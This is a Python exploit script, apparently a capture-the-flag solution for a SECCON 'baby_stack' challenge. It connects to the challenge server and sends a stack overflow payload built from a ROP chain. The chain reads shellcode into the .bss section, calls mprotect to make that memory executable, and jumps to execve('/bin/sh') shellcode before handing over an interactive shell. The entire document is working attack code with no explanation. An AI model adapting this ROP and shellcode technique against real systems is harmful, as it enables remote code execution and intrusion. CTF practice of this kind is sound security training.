import socket, struct, telnetlib, time

def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a): return struct.pack("<Q",a)
def u(a): return struct.unpack("<Q",a)[0]

# main
s, f = sock("baby_stack.pwn.seccon.jp", 15285)
#s, f = sock("localhost", 15285)

syscall = 0x00456d85
poprdi = 0x00470931 #pop rdi ; or byte [rax+0x39], cl ; ret  ;
poprax = 0x004ac054
poprdx = 0x004a247c #pop rdx ; or byte [rax-0x77], cl ; ret  ;
poprsi = 0x0046defd
incrax = 0x00456baf #inc rax ; mov qword [rsp+0x28], rax ; ret  ;
bss_addr = 0x00000000005ba260

shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

buf = "A"*104
buf += p(0x0)
buf += p(0x0)
buf += "A"*88
buf += p(0x0)
buf += "C"*192
# read(0, bss_addr, len(shellcode)) to input shellcode from STDIN
buf += p(poprax)
buf += p(bss_addr)
buf += p(poprdx)
buf += p(len(shellcode))
buf += p(poprsi)
buf += p(bss_addr)
buf += p(poprdi)
buf += p(0x0)
buf += p(poprax)
buf += p(0x0)
buf += p(syscall)
# mprotect(bss_addr&~0xfff, 0x1000, 7)
buf += p(poprax)
buf += p(bss_addr)
buf += p(poprdx)
buf += p(0x7)
buf += p(poprsi)
buf += p(0x1000)
buf += p(poprdi)
buf += p(bss_addr&~0xfff)
buf += p(poprax)
buf += p(0x9)
buf += p(incrax)
buf += p(syscall)
buf += p(bss_addr) # return to shellcode

f.write("AAAA" + '\n')                
time.sleep(0.5)
f.write(buf + '\n')                
time.sleep(0.5)
f.write(shellcode + '\n')                

shell(s)
